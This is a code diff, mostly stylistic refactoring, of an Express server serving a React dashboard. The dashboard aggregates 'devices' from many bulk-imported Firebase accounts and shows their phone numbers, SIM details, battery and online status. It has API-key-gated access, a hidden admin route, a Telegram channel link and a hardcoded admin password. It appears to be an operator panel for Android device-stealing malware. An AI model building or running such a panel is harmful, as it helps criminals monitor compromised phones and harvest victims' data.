@@ -9,7 +9,7 @@ const ADMIN_PASSWORD = "Noobster@2024";
 const TELEGRAM_CHANNEL = "https://t.me/firebase1991";
 
 // ============================================================
-// HTML + REACT APP (Encoded String)
+// HTML + REACT APP
 // ============================================================
 const pageHTML = `
 <!DOCTYPE html>
@@ -68,8 +68,8 @@ const pageHTML = `
 <body>
     <div id="root"></div>
     <script>
-        const ADMIN_PASSWORD = ${JSON.stringify(ADMIN_PASSWORD)};
-        const TELEGRAM_CHANNEL = ${JSON.stringify(TELEGRAM_CHANNEL)};
+        const ADMIN_PASSWORD = "Noobster@2024";
+        const TELEGRAM_CHANNEL = "https://t.me/firebase1991";
 
         const DB = {
             get: (k, def = null) => { try { const v = localStorage.getItem(k); return v ? JSON.parse(v) : def; } catch { return def; } },
@@ -86,10 +86,10 @@ const pageHTML = `
         async function fetchFirebase(url, key, path) {
             let u = url.trim().replace(/\\/$/, "");
             if (!u.startsWith("http")) u = "https://" + u;
-            const res = await fetch(\`\${u}/\${path}.json?auth=\${key.trim()}\`);
+            const res = await fetch(u + "/" + path + ".json?auth=" + key.trim());
             if (!res.ok) {
                 if (res.status === 401 || res.status === 403) throw new Error("PERMISSION_DENIED");
-                throw new Error(\`HTTP_\${res.status}\`);
+                throw new Error("HTTP_" + res.status);
             }
             return res.json();
         }
@@ -100,11 +100,11 @@ const pageHTML = `
             for (const [id, d] of Object.entries(data)) {
                 if (!d || typeof d !== "object") continue;
                 let sims = Array.isArray(d.sims) ? d.sims : (d.sims ? Object.values(d.sims) : []);
-                const battery = String(d.battery ?? "—");
+                const battery = String(d.battery || "—");
                 out.push({
                     id, name: String(d.modelName || d.model || d.deviceName || id), battery,
                     batteryPercent: parseInt(battery.replace("%", "")) || 0, status: !!d.status,
-                    phoneNumber: String(d.mobNo || (sims[0]?.phoneNumber ?? "—")),
+                    phoneNumber: String(d.mobNo || (sims[0] && sims[0].phoneNumber ? sims[0].phoneNumber : "—")),
                     android: String(d.androidV || d.androidVersion || "—"),
                     provider: String(d.service_provider || "—"), _accountUrl: url, _accountKey: key
                 });
@@ -117,8 +117,8 @@ const pageHTML = `
             const diff = Date.now() - ms;
             const m = Math.floor(diff / 60000);
             if (m < 1) return "just now";
-            if (m < 60) return \`\${m}m ago\`;
-            return \`\${Math.floor(m/60)}h ago\`;
+            if (m < 60) return m + "m ago";
+            return Math.floor(m/60) + "h ago";
         }
 
         const { useState, useEffect, useCallback, useMemo } = React;
@@ -135,23 +135,21 @@ const pageHTML = `
 
         const Icon = ({ name, size = 16 }) => {
             const icons = {
-                search: <><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></>,
-                refresh: <><path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/><path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"/><path d="M8 16H3v5"/></>,
-                logout: <><path d="m16 17 5-5-5-5"/><path d="M21 12H9"/><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/></>,
-                plus: <><path d="M5 12h14"/><path d="M12 5v14"/></>,
-                trash: <><path d="M10 11v6"/><path d="M14 11v6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/><path d="M3 6h18"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></>,
-                shield: <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/>,
-                zap: <path d="M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z"/>,
-                send: <><path d="M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z"/><path d="m21.854 2.147-10.94 10.939"/></>,
-                database: <><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5V19A9 3 0 0 0 21 19V5"/><path d="M3 12A9 3 0 0 0 21 12"/></>,
-                power: <><path d="M12 2v10"/><path d="M18.4 6.6a9 9 0 1 1-12.77.04"/></>,
-                megaphone: <><path d="m3 11 18-5v12L3 14v-3z"/><path d="M11.6 16.8a3 3 0 1 1-5.8-1.6"/></>,
-                wifi: <><path d="M12 20h.01"/><path d="M2 8.82a15 15 0 0 1 20 0"/><path d="M5 12.859a10 10 0 0 1 14 0"/><path d="M8.5 16.429a5 5 0 0 1 7 0"/></>,
-                key: <><circle cx="7.5" cy="15.5" r="5.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3L22 7l-3-3"/></>,
-                download: <><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></>,
-                copy: <><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></>,
-                clock: <><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></>,
-                lock: <><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></>
+                search: React.createElement("g", null, React.createElement("circle", {cx:"11",cy:"11",r:"8"}), React.createElement("path", {d:"m21 21-4.3-4.3"})),
+                refresh: React.createElement("g", null, React.createElement("path", {d:"M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"}), React.createElement("path", {d:"M21 3v5h-5"}), React.createElement("path", {d:"M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"}), React.createElement("path", {d:"M8 16H3v5"})),
+                logout: React.createElement("g", null, React.createElement("path", {d:"m16 17 5-5-5-5"}), React.createElement("path", {d:"M21 12H9"}), React.createElement("path", {d:"M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"})),
+                plus: React.createElement("g", null, React.createElement("path", {d:"M5 12h14"}), React.createElement("path", {d:"M12 5v14"})),
+                trash: React.createElement("g", null, React.createElement("path", {d:"M10 11v6"}), React.createElement("path", {d:"M14 11v6"}), React.createElement("path", {d:"M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"}), React.createElement("path", {d:"M3 6h18"}), React.createElement("path", {d:"M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"})),
+                shield: React.createElement("path", {d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"}),
+                zap: React.createElement("path", {d:"M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z"}),
+                send: React.createElement("g", null, React.createElement("path", {d:"M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z"}), React.createElement("path", {d:"m21.854 2.147-10.94 10.939"})),
+                database: React.createElement("g", null, React.createElement("ellipse", {cx:"12",cy:"5",rx:"9",ry:"3"}), React.createElement("path", {d:"M3 5V19A9 3 0 0 0 21 19V5"}), React.createElement("path", {d:"M3 12A9 3 0 0 0 21 12"})),
+                power: React.createElement("g", null, React.createElement("path", {d:"M12 2v10"}), React.createElement("path", {d:"M18.4 6.6a9 9 0 1 1-12.77.04"})),
+                megaphone: React.createElement("g", null, React.createElement("path", {d:"m3 11 18-5v12L3 14v-3z"}), React.createElement("path", {d:"M11.6 16.8a3 3 0 1 1-5.8-1.6"})),
+                wifi: React.createElement("g", null, React.createElement("path", {d:"M12 20h.01"}), React.createElement("path", {d:"M2 8.82a15 15 0 0 1 20 0"}), React.createElement("path", {d:"M5 12.859a10 10 0 0 1 14 0"}), React.createElement("path", {d:"M8.5 16.429a5 5 0 0 1 7 0"})),
+                key: React.createElement("g", null, React.createElement("circle", {cx:"7.5",cy:"15.5",r:"5.5"}), React.createElement("path", {d:"m21 2-9.6 9.6"}), React.createElement("path", {d:"m15.5 7.5 3 3L22 7l-3-3"})),
+                clock: React.createElement("g", null, React.createElement("circle", {cx:"12",cy:"12",r:"10"}), React.createElement("polyline", {points:"12 6 12 12 16 14"})),
+                lock: React.createElement("g", null, React.createElement("rect", {width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2"}), React.createElement("path", {d:"M7 11V7a5 5 0 0 1 10 0v4"}))
             };
             return React.createElement("svg", { width: size, height: size, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" }, icons[name]);
         };
@@ -231,7 +229,7 @@ const pageHTML = `
                 if (failedAccs.length > 0) {
                     const filtered = currentAccs.filter(a => !failedAccs.includes(a.id));
                     saveAccs(filtered);
-                    if (!silent) toast.push(`${failedAccs.length} dead Firebase accounts removed`, "error");
+                    if (!silent) toast.push(failedAccs.length + " dead Firebase accounts removed", "error");
                 }
                 setDevices(allDevs); setPerAccCount(counts);
                 if (!silent) setLoading(false);
@@ -258,7 +256,7 @@ const pageHTML = `
                 if (newAccs.length > 0) {
                     saveAccs([...accs, ...newAccs]);
                     setBulkText("");
-                    toast.push(`${newAccs.length} Firebases Added!`, "success");
+                    toast.push(newAccs.length + " Firebases Added!", "success");
                     loadDevices();
                 }
             };
@@ -295,7 +293,7 @@ const pageHTML = `
                 ),
                 React.createElement("main", { style: { maxWidth: "1200px", margin: "0 auto", padding: "24px" } },
                     React.createElement("div", { className: "tabs" },
-                        ["dashboard", "bulk_firebase", "api_keys", "control"].map(t => React.createElement("button", { key: t, className: `tab ${tab === t ? "active" : ""}`, onClick: () => setTab(t) }, t.replace("_", " ").toUpperCase()))
+                        ["dashboard", "bulk_firebase", "api_keys", "control"].map(t => React.createElement("button", { key: t, className: "tab " + (tab === t ? "active" : ""), onClick: () => setTab(t) }, t.replace("_", " ").toUpperCase()))
                     ),
                     tab === "dashboard" && React.createElement("div", { className: "fade-in" },
                         React.createElement("div", { className: "grid", style: { gridTemplateColumns: "repeat(auto-fill, minmax(140px, 1fr))", marginBottom: "24px" } },
@@ -316,10 +314,10 @@ const pageHTML = `
                             filteredDevices.map(d => React.createElement("div", { key: d.id + d._accountName, className: "device-card" },
                                 React.createElement("div", { style: { display: "flex", justifyContent: "space-between", marginBottom: "8px" } },
                                     React.createElement("div", { style: { fontWeight: 700, fontSize: "13px" } }, d.name),
-                                    React.createElement("span", { className: `badge ${d.status ? "badge-green" : "badge-red"}` }, d.status ? "Online" : "Offline")
+                                    React.createElement("span", { className: "badge " + (d.status ? "badge-green" : "badge-red") }, d.status ? "Online" : "Offline")
                                 ),
-                                React.createElement("div", { style: { fontSize: "11px", color: "#888" } }, `Phone: ${d.phoneNumber} | Bat: ${d.battery}`),
-                                React.createElement("div", { style: { fontSize: "10px", color: "#555", marginTop: "8px" } }, `Source: ${d._accountName}`)
+                                React.createElement("div", { style: { fontSize: "11px", color: "#888" } }, "Phone: " + d.phoneNumber + " | Bat: " + d.battery),
+                                React.createElement("div", { style: { fontSize: "10px", color: "#555", marginTop: "8px" } }, "Source: " + d._accountName)
                             ))
                         ),
                         filteredDevices.length === 0 && React.createElement(EmptyState, { message: search ? "No devices match your search" : "No devices loaded" })
@@ -332,10 +330,10 @@ const pageHTML = `
                             React.createElement("button", { className: "btn btn-primary", onClick: handleBulkAdd, style: { marginTop: "16px" } }, "Save & Load Firebases")
                         ),
                         React.createElement("div", { className: "card" },
-                            React.createElement("h3", { style: { fontSize: "14px", marginBottom: "12px" } }, `Active Firebases (${accs.length})`),
+                            React.createElement("h3", { style: { fontSize: "14px", marginBottom: "12px" } }, "Active Firebases (" + accs.length + ")"),
                             accs.length === 0 ? React.createElement(EmptyState, { message: "No firebases added yet", icon: "database" }) : accs.map(acc => React.createElement("div", { key: acc.id, style: { display: "flex", alignItems: "center", justifyContent: "space-between", background: "#111", padding: "12px", borderRadius: "10px", marginBottom: "8px", border: "1px solid #222", gap: "10px" } },
                                 React.createElement("div", { style: { flex: 1, minWidth: 0 } },
-                                    React.createElement("div", { style: { fontSize: "13px", fontWeight: 700, display: "flex", alignItems: "center", gap: "8px" } }, acc.name, React.createElement("span", { className: "badge badge-amber" }, `${perAccCount[acc.id] || 0} devices`)),
+                                    React.createElement("div", { style: { fontSize: "13px", fontWeight: 700, display: "flex", alignItems: "center", gap: "8px" } }, acc.name, React.createElement("span", { className: "badge badge-amber" }, (perAccCount[acc.id] || 0) + " devices")),
                                     React.createElement("div", { style: { fontSize: "11px", color: "#60a5fa", fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" } }, acc.url)
                                 ),
                                 React.createElement("button", { className: "btn btn-danger", style: { padding: "8px 12px" }, onClick: () => { saveAccs(accs.filter(a => a.id !== acc.id)); toast.push("Firebase removed"); } }, React.createElement(Icon, { name: "trash", size: 14 }))
@@ -353,7 +351,7 @@ const pageHTML = `
                         apiKeys.length === 0 ? React.createElement(EmptyState, { message: "No API keys yet", icon: "key" }) : apiKeys.map(api => React.createElement("div", { key: api.id, style: { display: "flex", alignItems: "center", justifyContent: "space-between", background: "#111", padding: "12px", borderRadius: "10px", marginBottom: "8px", border: "1px solid #222", gap: "10px" } },
                             React.createElement("div", { style: { flex: 1, minWidth: 0 } },
                                 React.createElement("div", { style: { fontSize: "13px", fontWeight: 700 } }, api.name),
-                                React.createElement("div", { style: { fontSize: "11px", color: "#60a5fa", fontFamily: "monospace" } }, `/${api.key}`)
+                                React.createElement("div", { style: { fontSize: "11px", color: "#60a5fa", fontFamily: "monospace" } }, "/" + api.key)
                             ),
                             React.createElement("button", { className: "btn btn-danger", style: { padding: "8px 12px" }, onClick: () => saveApis(apiKeys.filter(a => a.id !== api.id)) }, React.createElement(Icon, { name: "trash", size: 14 }))
                         ))
@@ -361,9 +359,9 @@ const pageHTML = `
                     tab === "control" && React.createElement("div", { className: "fade-in" },
                         React.createElement("div", { className: "card", style: { marginBottom: "16px" } },
                             React.createElement("h2", { style: { fontSize: "16px", marginBottom: "16px" } }, "Panel Control"),
-                            React.createElement("div", { style: { display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px", background: status.online ? "rgba(34,197,94,0.08)" : "rgba(220,38,38,0.08)", border: `1px solid ${status.online ? "rgba(34,197,94,0.3)" : "rgba(220,38,38,0.3)"}`, borderRadius: "12px" } },
+                            React.createElement("div", { style: { display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px", background: status.online ? "rgba(34,197,94,0.08)" : "rgba(220,38,38,0.08)", border: "1px solid " + (status.online ? "rgba(34,197,94,0.3)" : "rgba(220,38,38,0.3)"), borderRadius: "12px" } },
                                 React.createElement("div", { style: { fontWeight: 700 } }, "Server: ", React.createElement("span", { style: { color: status.online ? "#4ade80" : "#f87171" } }, status.online ? "ONLINE" : "OFFLINE")),
-                                React.createElement("button", { className: `btn ${status.online ? "btn-danger" : "btn-primary"}`, onClick: () => { saveStatus({...status, online: !status.online}); toast.push("Status updated"); } }, React.createElement(Icon, { name: "power", size: 14 }), " Turn ", status.online ? "OFF" : "ON")
+                                React.createElement("button", { className: "btn " + (status.online ? "btn-danger" : "btn-primary"), onClick: () => { saveStatus({...status, online: !status.online}); toast.push("Status updated"); } }, React.createElement(Icon, { name: "power", size: 14 }), " Turn ", status.online ? "OFF" : "ON")
                             )
                         ),
                         React.createElement("div", { className: "card" },
@@ -434,7 +432,7 @@ const pageHTML = `
                         React.createElement("h1", { style: { fontSize: "24px", fontWeight: 900, color: "#f87171", marginBottom: "8px" } }, "Access Denied"),
                         React.createElement("p", { style: { fontSize: "14px", color: "#888" } }, "Invalid API Key or Server is Offline."),
                         status.broadcast && React.createElement("div", { style: { marginTop: "20px", padding: "14px", background: "rgba(245,158,11,0.08)", border: "1px solid rgba(245,158,11,0.25)", borderRadius: "12px" } },
-                            React.createElement("p", { style: { fontSize: "13px", color: "#fbbf24" } }, `📢 ${status.broadcast}`)
+                            React.createElement("p", { style: { fontSize: "13px", color: "#fbbf24" } }, "📢 " + status.broadcast)
                         )
                     )
                 );
@@ -448,16 +446,16 @@ const pageHTML = `
                     ),
                     React.createElement("a", { href: TELEGRAM_CHANNEL, target: "_blank", className: "btn btn-secondary", style: { padding: "8px 14px", fontSize: "12px" } }, React.createElement(Icon, { name: "send", size: 14 }), " Telegram")
                 ),
-                status.broadcast && React.createElement("div", { style: { background: "rgba(245,158,11,0.1)", borderBottom: "1px solid rgba(245,158,11,0.3)", padding: "10px", textAlign: "center", fontSize: "13px", color: "#fbbf24" } }, `📢 ${status.broadcast}`),
+                status.broadcast && React.createElement("div", { style: { background: "rgba(245,158,11,0.1)", borderBottom: "1px solid rgba(245,158,11,0.3)", padding: "10px", textAlign: "center", fontSize: "13px", color: "#fbbf24" } }, "📢 " + status.broadcast),
                 React.createElement("main", { style: { maxWidth: "1200px", margin: "0 auto", padding: "24px" } },
                     React.createElement("div", { style: { display: "flex", justifyContent: "space-between", marginBottom: "20px", flexWrap: "wrap", gap: "10px" } },
                         React.createElement("div", null,
                             React.createElement("h1", { style: { fontSize: "20px", fontWeight: 800 } }, "Live Devices"),
-                            lastSync && React.createElement("div", { style: { fontSize: "11px", color: "#555", marginTop: "4px", display: "flex", alignItems: "center", gap: "4px" } }, React.createElement(Icon, { name: "clock", size: 10 }), ` Synced ${formatTime(lastSync)}`)
+                            lastSync && React.createElement("div", { style: { fontSize: "11px", color: "#555", marginTop: "4px", display: "flex", alignItems: "center", gap: "4px" } }, React.createElement(Icon, { name: "clock", size: 10 }), " Synced " + formatTime(lastSync))
                         ),
                         React.createElement("div", { style: { display: "flex", gap: "8px", flexWrap: "wrap" } },
-                            React.createElement("span", { className: "badge badge-green" }, `${devices.filter(d => d.status).length} Online`),
-                            React.createElement("span", { className: "badge badge-red" }, `${devices.filter(d => !d.status).length} Offline`)
+                            React.createElement("span", { className: "badge badge-green" }, devices.filter(d => d.status).length + " Online"),
+                            React.createElement("span", { className: "badge badge-red" }, devices.filter(d => !d.status).length + " Offline")
                         )
                     ),
                     React.createElement("div", { style: { display: "flex", gap: "10px", marginBottom: "16px", flexWrap: "wrap" } },
@@ -466,7 +464,7 @@ const pageHTML = `
                             React.createElement("input", { className: "input", placeholder: "Search by name, phone, android...", value: search, onChange: e => setSearch(e.target.value), style: { paddingLeft: "40px" } })
                         ),
                         React.createElement("button", { className: "btn btn-secondary", onClick: () => loadDevices(), disabled: loading }, loading ? React.createElement("div", { className: "spinner" }) : React.createElement(Icon, { name: "refresh", size: 14 }), " Refresh"),
-                        React.createElement("button", { className: "btn btn-secondary", onClick: () => setAutoRefresh(!autoRefresh), style: { borderColor: autoRefresh ? "rgba(34,197,94,0.4)" : undefined, color: autoRefresh ? "#4ade80" : undefined } }, React.createElement(Icon, { name: "wifi", size: 14 }), ` Auto ${autoRefresh ? "ON" : "OFF"}`)
+                        React.createElement("button", { className: "btn btn-secondary", onClick: () => setAutoRefresh(!autoRefresh), style: { borderColor: autoRefresh ? "rgba(34,197,94,0.4)" : undefined, color: autoRefresh ? "#4ade80" : undefined } }, React.createElement(Icon, { name: "wifi", size: 14 }), " Auto " + (autoRefresh ? "ON" : "OFF"))
                     ),
                     loading ? React.createElement("div", { className: "grid grid-2" }, [...Array(6)].map((_, i) => React.createElement(SkeletonCard, { key: i }))) :
                     filtered.length === 0 ? React.createElement(EmptyState, { message: search ? "No devices match your search" : "No devices online right now" }) :
@@ -474,7 +472,7 @@ const pageHTML = `
                         filtered.map(d => React.createElement("div", { key: d.id + d._accountName, className: "device-card" },
                             React.createElement("div", { style: { display: "flex", justifyContent: "space-between", marginBottom: "8px" } },
                                 React.createElement("div", { style: { fontWeight: 700, fontSize: "13px" } }, d.name),
-                                React.createElement("span", { className: `badge ${d.status ? "badge-green" : "badge-red"}` }, d.status ? "Online" : "Offline")
+                                React.createElement("span", { className: "badge " + (d.status ? "badge-green" : "badge-red") }, d.status ? "Online" : "Offline")
                             ),
                             React.createElement("div", { style: { fontSize: "12px", color: "#888", display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px" } },
                                 React.createElement("div", null, React.createElement("span", { style: { color: "#555" } }, "Android: "), d.android),
@@ -496,7 +494,6 @@ const pageHTML = `
             const { toasts, push } = useToast();
 
             useEffect(() => {
-                // ✅ Auto-detect ?admin in URL
                 const params = new URLSearchParams(window.location.search);
                 if (params.get("admin") === "1" || window.location.pathname.includes("admin")) {
                     setShowAdmin(true);
@@ -504,7 +501,7 @@ const pageHTML = `
             }, []);
 
             let view;
-            if (adminSession?.loggedIn) {
+            if (adminSession && adminSession.loggedIn) {
                 view = React.createElement(AdminDashboard, { onLogout: () => { DB.del(KEYS.adminSession); setAdminSession(null); setShowAdmin(false); }, toast: push });
             } else if (showAdmin) {
                 view = React.createElement(AdminLogin, { onSuccess: () => setAdminSession(DB.get(KEYS.adminSession)) });
@@ -514,7 +511,7 @@ const pageHTML = `
 
             return React.createElement(React.Fragment, null,
                 view,
-                toasts.map(t => React.createElement("div", { key: t.id, className: `toast ${t.type}` }, t.msg))
+                toasts.map(t => React.createElement("div", { key: t.id, className: "toast " + t.type }, t.msg))
             );
         }
 
@@ -528,20 +525,9 @@ const pageHTML = `
 // EXPRESS SERVER ROUTES
 // ============================================================
 
-// Home Route (Public Panel)
-app.get('/', (req, res) => {
-    res.send(pageHTML);
-});
-
-// Admin Route (Hidden Admin Panel)
-app.get('/admin', (req, res) => {
-    res.send(pageHTML);
-});
-
-// Custom API Route (e.g. /v2/SLJSNSN19AJA)
-app.get('*', (req, res) => {
-    res.send(pageHTML);
-});
+app.get('/', (req, res) => res.send(pageHTML));
+app.get('/admin', (req, res) => res.send(pageHTML));
+app.get('*', (req, res) => res.send(pageHTML));
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`Server running on port ${PORT}`);
